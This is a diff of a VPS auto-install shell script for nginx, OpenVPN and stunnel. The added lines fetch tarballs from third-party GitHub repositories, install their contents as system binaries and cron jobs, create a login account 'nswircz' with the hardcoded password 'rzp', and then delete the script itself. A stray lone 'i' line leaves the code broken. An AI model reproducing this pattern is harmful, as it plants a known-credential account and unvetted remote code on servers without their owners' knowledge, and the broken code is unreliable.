@@ -194,20 +194,42 @@ sq3
 
 
 
- nginx
-apt-get -y install nginx php5-fpm php5-cli libexpat1-dev libxml-parser-perl
+ # Install WebServer
+apt-get -y install nginx
+
+# WebServer Configuration
+cd
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/zero9911/a/master/script/nginx.conf"
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/Dreyannz/AutoScriptVPS/master/Files/Nginx/nginx.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by Dragon96 | telegram @ranger_9699 | whatsapp +60162327524</pre>" > /home/vps/public_html/index.php
-echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/zero9911/a/master/script/vps1.conf"
-sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
-cd
+echo "<h1><center>AutoScriptVPS by _Dreyannz_</center></h1>" > /home/vps/public_html/index.html
+echo "<h3><center>For More Info Visit My <a href="https://github.com/Dreyannz">Github Repositories</a></center><h3>" >> /home/vps/public_html/index.html
+echo "<h3><center>You Can Also Contact Me at <a href="https://www.facebook.com/Dreyannz">Facebook</a> and <a href="https://twitter.com/Dreyannz">Twitter</a></center></h3>" >> /home/vps/public_html/index.html
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/Dreyannz/AutoScriptVPS/master/Files/Nginx/vps.conf"
+service nginx restart
 
-
-
+# openvpn
+apt-get  -y install openvpn
+cd /etc/openvpn/
+wget https://raw.githubusercontent.com/buchook/00web8/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+# wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/buchook/00web8/master/iptables.up.rules"
+# sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+# sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+i
+# iptables-restore < /etc/iptables.up.rules
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/buchook/00web8/master/client.ovpn"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget https://raw.githubusercontent.com/buchook/00web8/master/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash nswircz
+echo "nswircz:rzp" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
 
 # install vnstat gui
 cd /home/vps/public_html/
@@ -222,7 +244,6 @@ sed -i 's/Internal/Internet/g' config.php
 sed -i '/SixXS IPv6/d' config.php
 cd
 
-
 # install stunnel4
 apt-get -y install stunnel4
 wget -O /etc/stunnel/stunnel.pem "https://raw.githubusercontent.com/ZENON-VPN/autoscript/master/updates/stunnel.pem"
@@ -230,27 +251,6 @@ wget -O /etc/stunnel/stunnel.conf "https://raw.githubusercontent.com/ZENON-VPN/a
 sed -i $MYIP2 /etc/stunnel/stunnel.conf
 sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
 service stunnel4 restart
-
-# openvpn
-# openvpn
-apt-get -y install openvpn
-cd /etc/openvpn/
-wget https://raw.githubusercontent.com/sslmode/78/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/Vpaproject/script.sh/master/iptables.up.rules"
-sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
-sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
-iptables-restore < /etc/iptables.up.rules
-# etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/sslmode/78/master/client.ovpn"
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
-mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
-chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash dragon
-echo "dragon:369" | chpasswd
-echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
-rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
-clear
 
 #Setting USW
 apt-get install ufw
